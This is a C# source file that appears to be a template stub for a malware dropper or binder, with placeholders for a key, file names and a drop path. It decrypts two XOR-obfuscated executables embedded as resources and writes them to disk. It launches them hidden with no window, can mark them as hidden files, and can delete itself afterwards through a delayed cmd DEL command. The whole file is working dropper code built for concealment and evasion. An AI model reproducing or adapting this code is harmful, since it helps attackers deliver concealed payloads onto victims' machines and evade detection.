﻿
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace SoveReign
{
    internal class Machiavelli
    {
        static void Main(string[] args)
        {
            try
            {
                ExtractDaemon.ExtractResources();
#if HideFile
                RuntimeDaemon.HideFile(Config.Application1, Config.Application2);
#endif

                RuntimeDaemon.AppRuntime();
#if SelfRemove
                RuntimeDaemon.SelfRemover();
#endif
            } 
            catch { Environment.Exit(0); }
        }
    }

    internal class Config
    {
        public static string ApplicationPath = Environment.ExpandEnvironmentVariables("%PathToDrop%");
        public static string ApplicationKey = "%Key%";

        public static string Application1 = Path.Combine(ApplicationPath, EncryptDeamon.StringMoar("%exe1_name%", ApplicationKey));
        public static string Application2 = Path.Combine(ApplicationPath, EncryptDeamon.StringMoar("%exe2_name%", ApplicationKey));
    }

    internal class RuntimeDaemon
    {
        public static void AppRuntime()
        {
            if (!IsProcessRunning(Config.Application1))
            {
                StartProcess(Config.Application1);
            }

            if (!IsProcessRunning(Config.Application2))
            {
                StartProcess(Config.Application2);
            }
        }

        private static bool IsProcessRunning(string processName)
        {
            string processNameWithoutExtension = Path.GetFileNameWithoutExtension(processName);
            return Process.GetProcessesByName(processNameWithoutExtension).Any();
        }

        private static void StartProcess(string applicationPath)
        {
            var startInfo = new ProcessStartInfo()
            {
                FileName = applicationPath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };

            Process.Start(startInfo);
        }

#if SelfRemove
        public static void SelfRemover()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = "/c timeout /t 1 && DEL /f " + currentProcessFileName;
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
#endif

#if HideFile
        public static void HideFile(string File1, string File2)
        {
            File.SetAttributes(File1, File.GetAttributes(File1) | FileAttributes.Hidden);
            File.SetAttributes(File2, File.GetAttributes(File2) | FileAttributes.Hidden);
        }
#endif
    }

    internal class ExtractDaemon
    {
        public static void ExtractResources()
        {
            if (!File.Exists(Config.Application1) || !File.Exists(Config.Application2)) {
                ExtractAndSaveResource("%exe1_resource_name%", Config.Application1, Config.ApplicationKey);
                ExtractAndSaveResource("%exe2_resource_name%", Config.Application2, Config.ApplicationKey);
            }
        }

        public static void ExtractAndSaveResource(string resourceName, string outputPath, string key)
        {
            var assembly = Assembly.GetExecutingAssembly();

            using (var stream = assembly.GetManifestResourceStream(resourceName))
            {
                if (stream != null)
                {
                    byte[] encryptedBytes;
                    using (var memoryStream = new MemoryStream())
                    {
                        stream.CopyTo(memoryStream);
                        encryptedBytes = memoryStream.ToArray();
                    }
                    byte[] decryptedBytes = EncryptDeamon.BytesMoar(encryptedBytes, key);
                    File.WriteAllBytes(outputPath, decryptedBytes);
                }
            }
        }
    }

    internal class EncryptDeamon
    {
        public static byte[] BytesMoar(byte[] encryptedBytes, string xorKey)
        {
            byte[] decryptedBytes = new byte[encryptedBytes.Length];

            for (int i = 0; i < encryptedBytes.Length; i++)
            {
                decryptedBytes[i] = (byte)(encryptedBytes[i] ^ xorKey[i % xorKey.Length]);
            }

            return decryptedBytes;
        }

        public static string StringMoar(string BytesString, string MoarKey)
        {
            byte[] inputBytes = Convert.FromBase64String(BytesString);
            byte[] keyBytes = Encoding.UTF8.GetBytes(MoarKey);
            byte[] outputBytes = new byte[inputBytes.Length];

            for (int i = 0; i < inputBytes.Length; i++)
            {
                outputBytes[i] = (byte)(inputBytes[i] ^ keyBytes[i % keyBytes.Length]);
            }
            return Encoding.UTF8.GetString(outputBytes);
        }
    }
}